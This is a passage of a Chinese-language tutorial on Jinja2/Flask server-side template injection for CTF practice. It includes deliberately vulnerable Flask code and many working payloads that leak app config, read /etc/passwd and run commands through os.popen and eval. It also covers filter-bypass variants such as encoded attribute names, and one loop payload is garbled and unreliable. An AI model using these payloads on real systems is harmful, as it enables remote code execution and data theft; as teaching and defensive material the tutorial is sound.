<p>变量通过传递字典来进行使用，当使用 for 语句的时候，变量可以是列表</p>
<p>创建和渲染模板的最基本方法是通过 <code>Template</code>，通过创建一个 <code>Template</code> 的实例，<br>会得到一个新的模板对象，模板对象有一个 <code>render()</code> 的方法，该方法在调用 <code>dict</code> 或 <code>keywords</code> 参数时填充模板</p>
<p>E.g</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">eg = Template(<span class="string">&#x27;hello &#123;&#123;name&#125;&#125;&#x27;</span>)</span><br><span class="line">result = eg.render(name = <span class="string">&#x27;111&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>结果就是</p>
<p><code>hello 111</code> </p>
<p><strong>成因：</strong></p>
<p>欸但是一般代码中不带这个<code>&#123;&#123;...&#125;&#125;</code>，就会出现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    t = <span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    t = Template<span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello  %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;please input name:&quot;</span>)  <span class="comment"># 用于模拟获取 name 参数，你可以根据实际情况获取 name 的值</span></span><br><span class="line">t = Template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Hello  %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (name))</span><br><span class="line"><span class="built_in">print</span>(t.render())</span><br></pre></td></tr></table></figure>

<p>这边你正常传入一个字符串，就是正常显示的，但是当你传入一个<code>&#123;&#123;7*7&#125;&#125;</code>，结果就是会变成49，这是因为<code>&#123;&#123;...&#125;&#125;</code>被渲染到Template里了，这点在上面的jinja2语法中有所体现</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w2.png"></p>
<p>然后传入49</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w3.png"></p>
<p>那么我们知道了可以传入<code>&#123;&#123;...&#125;&#125;</code>进而被Template渲染后，我们就可以尝试干两件事：<strong>获取信息</strong>和<strong>RCE</strong></p>
<p>我们先看获取一些信息这边</p>
<p>比如查看一些什么config和env</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;		# 获取config，包含flag</span><br><span class="line">&#123;&#123;request.environ&#125;&#125;	# 获取环境信息</span><br></pre></td></tr></table></figure>

<p>给个源码方便你们也可以试试（）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;Flag&#x27;</span>] = <span class="string">&#x27;flag&#123;You_Find_Me!!!&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAG = os.getenv(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;here_is_a_flag!!!&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_flag_to_environ</span>():</span><br><span class="line">    request.environ[<span class="string">&#x27;FLAG&#x27;</span>] = FLAG</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    t = <span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>然后我们直接 <code>?name=&#123;&#123;config&#125;&#125;</code></p>
<p>可以看到</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w4.png"></p>
<p>再看看 <code>&#123;&#123;request.environ&#125;&#125;</code></p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w5.png"></p>
<p>如果是想进行RCE的话，那就需要os库，但是肯定不会傻到内置os库给你用的，所以就需要你自己导入一个os库，使用system或者popen这种危险函数来读取</p>
<p>然后就有思路：</p>
<ul>
<li>使用万能的对象（比如字符串对象’’）-&gt; 子类 -&gt; 基类 -&gt; 危险类的危险函数（大多数情况）</li>
<li>直接使用代码中定义的对象（包括已经导入的库）所包含的危险子类中的危险函数（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18243707">R3CTF 2024 web jinjaclub wp - LamentXU - 博客园</a>）</li>
</ul>
<p>这里说是“万能的对象”，其实大多数情况下，最好用最经典的还是字符串对象’’，当然[]这些对象也是可以的</p>
<p>python中每个对象都有个属性<code>__class__</code>，用于返回该对象所属的类。而我们要做的，就是<strong>获取到object基类</strong></p>
<p><strong>使用<code>&#39;&#39;.__class__</code>我们就完成了第一步，即，获取到一个字符串对象</strong></p>
<p><code>[]</code>和<code>&#123;&#125;</code>也可以</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w6.png"></p>
<p>还有：</p>
<p><code>__bases__</code>：以元组的形式返回一个类所直接继承的类</p>
<p><code>__base__</code>：以字符串形式返回一个类所直接继承的类</p>
<p><code>__mro__</code>：返回解析方法调用的顺序</p>
<p><code>__subclasses__()</code>： 是一个特殊方法，用于获取某个类的所有直接子类</p>
<p><code>__init__</code>：所有自带带类都包含init方法，便于利用他当跳板来调用globals</p>
<p><code>function.__globals__</code>：用于获取function所处空间下可使用的module、方法以及所有变量</p>
<p><code>[&#39;__builtins__&#39;]</code>：从全局变量字典中获取内置模块的引用</p>
<ul>
<li>通过 <code>__builtins__</code> 访问 <code>eval()</code> 或 <code>exec()</code> 函数来执行恶意代码</li>
<li>使用 <code>__builtins__</code> 中的 <code>open()</code> 函数来读取或写入文件</li>
<li>利用 <code>__builtins__</code> 中的 <code>__import__()</code> 函数来动态导入其他模块，比如 <code>os</code> 或 <code>sys</code>，然后执行系统命令</li>
</ul>
<p><code>__import__</code>：导入模块</p>
<p><code>__getitem__</code>：提取元素</p>
<p>比如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__.__bases__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#(&lt;class &#x27;object&#x27;&gt;,)</span></span><br></pre></td></tr></table></figure>

<ol>
<li><code>&quot;&quot;</code>：创建一个空字符串</li>
<li><code>__class__</code>：访问该空字符串的类。对于字符串对象，其类是 <code>str</code></li>
<li><code>__bases__</code>：访问 <code>str</code> 类的基类。对于内置类型，<code>str</code> 类的基类是 <code>object</code></li>
</ol>
<p>这三个属于获取基类的办法。获取到object基类之后，因为这个基类的子类是这个python程序目前的所有类，所以可以直接找到我们要的os（是基类的一个子类）</p>
<p><strong>使用<code>&quot;&quot;.__class__.__bases__</code>或<code>&quot;&quot;.__class__.__mro__[1]</code>或<code>&quot;&quot;.__class__.__base__</code>我们就完成了第二步，即，获取到了object基类</strong></p>
<p>我们看这个：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__())</span><br></pre></td></tr></table></figure>

<ol>
<li>获取空字符串的类：<code>&quot;&quot;.__class__</code> 返回 <code>str</code> 类</li>
<li>获取 <code>str</code> 类的继承顺序：<code>__mro__</code> 返回一个元组，列出 <code>str</code> 类及其基类的顺序</li>
<li>获取 <code>str</code> 类的直接基类：<code>[1]</code> 取出 <code>__mro__</code> 元组中的第二个元素，即 <code>object</code> 类</li>
<li>获取 <code>object</code> 类的所有直接子类：调用 <code>__subclasses__()</code> 方法</li>
</ol>
<p>这样打印出来的结果就是object下的所有子类</p>
<p>现在我们要进行RCE的话</p>
<p>我们要做的，是找到使用os的内置类。那这可多了，这里可以fuzz出（由python环境改变而改变，可以直接bp数字爆破一下）如果没有的话，也可以找一些可以读取文件的内置类，那么<em><strong>warnings.catch_warnings</strong></em>类 可就成重灾区了（有很多其他的）</p>
<p>我们发现object基类的__subclasses__()中 <strong>&lt;type ‘warnings.catch_warnings’&gt;</strong> 的索引值为138（随环境改变而改变），导入他后直接导入os并RCE即可，你去找<code>os._wrap_close</code>也可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;tac flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>也可以稍微拼接绕过一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>当然，你也可以找到其他调用了os的内置类，利用<code>__init__</code>和<code>function.__globals__</code>来调用内置类中os类的方法，如subprocess.popen：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>有用的python内置类有很多，这里贴一个脚本，可以直接把subclass出来的东西放data里帮你检测有用的类的索引</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将查找到的父类列表替换到data中 &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()</span></span><br><span class="line">data = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 在这里添加可以利用的类，下面会介绍这些类的利用方法</span></span><br><span class="line">userful_class = [<span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;os._wrap_close&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, <span class="string">&#x27;warnings.catch_warnings&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>, <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> class_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> userful_class:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(class_list.index(c)) + <span class="string">&quot;: &quot;</span> + c)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>做题流程也很明确了：确定好要用SSTI打RCE之后用burp（payload：<code>&quot;&quot;.__class__.__mro__[1].__subclasses__()</code>）fuzz服务器找os或者file，然后读取文件或RCE</p>
<p><strong>总结一下就是：先找object基类，然后subclasses出所有的类（就应该是一大坨玩意）然后放上面那个脚本里跑索引。找到能用的类之后去网上找这个类对应的payload打就完了）</strong></p>
<h3 id="2-Bypass"><a href="#2-Bypass" class="headerlink" title="(2)Bypass"></a>(2)Bypass</h3><h4 id="过滤了两个大括号"><a href="#过滤了两个大括号" class="headerlink" title="过滤了两个大括号"></a>过滤了两个大括号</h4><p>可以直接<code>&#123;%print()%&#125;</code>替代，上文有介绍，与<code>&#123;&#123;...&#125;&#125;</code>同等效果，想看回显可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(7*7)%&#125;</span><br></pre></td></tr></table></figure>

<p>也可以使用flask控制语句<code>&#123;%...%&#125;</code>以<code>&#123;%end%&#125;</code>结尾(括号内可控制语句,定义变量,写循环判断)</p>
<p>于是使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%if().__class__%&#125;123&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>__class__</code>类下存在内容就输出123</p>
<p>你甚至可以用循环来查找可以用的类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in. class.base_subclasses () %&#125;&#123;% if c.__name__==&#x27;catch warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;] .eval(&#x27;__import__(&quot;os&quot;).popen(&quot;&lt;command&gt;&quot;).read()&#x27;)&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">% 是模板引擎（如 Jinja2）中的一个特殊字符，用于标记模板代码的开始和结束</span><br><span class="line">&#123;% for c in class.base_subclasses() %&#125;：这是一个循环语句，它遍历class的所有基类（父类）的子类</span><br><span class="line">&#123;% if c.__name__==&#x27;catch warnings&#x27;%&#125;：这是一个条件判断语句，它检查当前遍历到的子类的名称是否是&#x27;catch warnings&#x27;</span><br><span class="line">c.__init__.__globals__：获取当前类__init__方法的全局变量字典</span><br><span class="line">[&#x27;__builtins__&#x27;]：从全局变量字典中获取内置模块的引用</span><br><span class="line">eval(&#x27;__import__(&quot;os&quot;).popen(&quot;&lt;command&gt;&quot;).read()&#x27;)：使用eval函数执行一个字符串形式的Python表达式。这个表达式首先导入os模块，然后使用popen函数执行一个系统命令（&lt;command&gt;应被替换为实际的命令），并读取命令的输出结果</span><br><span class="line">&#123;% endif %&#125;：结束条件判断语句</span><br><span class="line">&#123;% endfor %&#125;：结束循环语句</span><br></pre></td></tr></table></figure>



<h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__glo&quot;+&quot;bal__&quot; == &quot;__global__&quot;</span><br></pre></td></tr></table></figure>



<h4 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了 ."></a>过滤了 .</h4><p><code>[]</code>替代</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.b == a[<span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>



<h3 id="request-args逃逸"><a href="#request-args逃逸" class="headerlink" title="request.args逃逸"></a>request.args逃逸</h3><p>如果题目中没有过滤request，则可以将一些含有敏感字符的位置用get传，再在SSTI中用request.args.arg1逃逸到get参数里去</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.args.name</span><br><span class="line">request.cookies.name</span><br><span class="line">request.headers.name</span><br><span class="line">request.values.name</span><br><span class="line">request.form.name</span><br></pre></td></tr></table></figure>

<p><strong>GET</strong> (用<strong>request.args</strong>)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=<span class="built_in">open</span>&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><strong>POST</strong> (用<strong>request.values</strong>)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line">post:arg1=<span class="built_in">open</span>&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>



<h4 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了 []"></a>过滤了 []</h4><p><strong>.getitem</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tuple[<span class="number">0</span>] == tuple.<span class="built_in">getitem</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>.pop</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()[128] = __subclasses__().pop(128)</span><br></pre></td></tr></table></figure>

<p>E.g</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原payload，可以使用__base__绕过__bases__[0]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 通过__getitem__()绕过__bases__[0]、通过pop(128)绕过__subclasses__()[128]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">128</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原payload</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br><span class="line"><span class="comment"># 绕过</span></span><br><span class="line">[].__class__.__base__.__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><code>pop</code> 是列表的一个方法，用于移除列表中的元素并返回该元素。这里 <code>pop(128)</code> 表示从列表中移除并返回索引为 128 的元素</p>
<h4 id="过滤了-config"><a href="#过滤了-config" class="headerlink" title="过滤了 config"></a>过滤了 config</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕过，同样可以获取到config</span></span><br><span class="line">&#123;&#123;<span class="variable language_">self</span>.<span class="built_in">dict</span>._TemplateReference__context.config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>用内置函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>





<h4 id="过滤了-init"><a href="#过滤了-init" class="headerlink" title="过滤了__init__"></a>过滤了<code>__init__</code></h4><p>用<code>__enter__</code>或者<code>__exit__</code>替代</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="过滤了os"><a href="#过滤了os" class="headerlink" title="过滤了os"></a>过滤了os</h4><p>可以使用翻转字符的方法，比如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).popen</span><br></pre></td></tr></table></figure>

<p>这跟<code>__import__(&#39;os&#39;).popen</code>等效</p>
<h4 id="编码过滤"><a href="#编码过滤" class="headerlink" title="编码过滤"></a>编码过滤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以下皆为 &quot;&quot;[&quot;__class__&quot;] 等效形式</span></span><br><span class="line"><span class="comment"># 八进制</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>]</span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>]</span><br><span class="line"><span class="comment"># Unicode</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>实战下就可以是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)())%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat /flag&quot;)|attr(&quot;read&quot;)())%&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="∞-一些高端的"><a href="#∞-一些高端的" class="headerlink" title="(∞)一些高端的"></a>(∞)一些高端的</h3><p>展示些高端玩法（）</p>
<h4 id="内置类-Undefined"><a href="#内置类-Undefined" class="headerlink" title="内置类 Undefined"></a>内置类 Undefined</h4><p>在渲染<code>().__class__.__base__.__subclasses__().c.__init__</code>初始化一个类时，此处由于不存在c类理论上应该报错停止执行，但是实际上并不会停止执行，这是由于Jinja2内置了<strong>Undefined</strong>类型，渲染结果显示为<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code>，所以看起来并不存在的c类实际上触发了内置的<strong>Undefined</strong>类型</p>
<p>可用payload：</p>
